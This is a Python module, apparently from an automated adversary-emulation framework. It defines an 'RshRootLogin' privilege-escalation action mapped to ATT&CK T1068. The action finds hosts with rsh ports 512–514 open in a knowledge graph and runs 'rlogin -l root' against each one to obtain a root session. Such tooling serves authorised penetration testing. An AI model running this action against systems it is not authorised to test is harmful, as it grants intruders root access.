from typing import Any, Union

from action_state_interface.action import Action
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


class RshRootLogin(Action):
    """
    Implementation of privilege escalation using rshclient.
    """

    def __init__(self):
        super().__init__("RshRootLogin", "TA0004", "T1068 Exploitation for Privilege Escalation", ["loud", "fast"])
        self.noise = 0.8
        self.impact = 0.8

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        return [f"Utilise RSH in an attempt to obtain root access on {pattern.get('asset').get('ip_address')}"]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        get_target_patterns check to identify rsh ports.
        """
        asset = Entity('Asset', alias='asset')
        port = Entity('OpenPort', alias='port')
        pattern = asset.with_edge(Relationship('has', direction='r')).with_node(port)
        matches = kg.match(pattern).where('port.number IN [512, 513, 514]')

        ip_set = {}
        for match in matches:
            ip = match.get('asset').get('ip_address')
            if ip in ip_set:
                continue
            else:
                ip_set[ip] = []
                ip_set[ip].append(match)

        return [p[0] for p in ip_set.values()]

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Use the rsh client to obtain a root session.
        """
        if not len(pattern):
            raise ActionExecutionError

        ip_address = pattern._patterns[0].get('asset').get('ip_address')

        result = shell('rlogin', ['-l', 'root', ip_address])
        exit_status = result.exit_status
        if exit_status:
            raise ActionExecutionError
        else:
            sess_id = sessions.add_session({"host": ip_address, "username": 'root'})
            result.session = sess_id
            return result

    def capture_state_change(self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any):
        """
        Add the rsh session to the knowledge graph.
        rsh session is attached to the port.
        """
        legacy_port = pattern.get('port')
        if not legacy_port:
            raise ActionExecutionError

        session = Entity('Session', alias='session', protocol='rsh', id=output.session, executes_on=legacy_port._id)
        return [(None, "merge", session)]


actions = [RshRootLogin()]
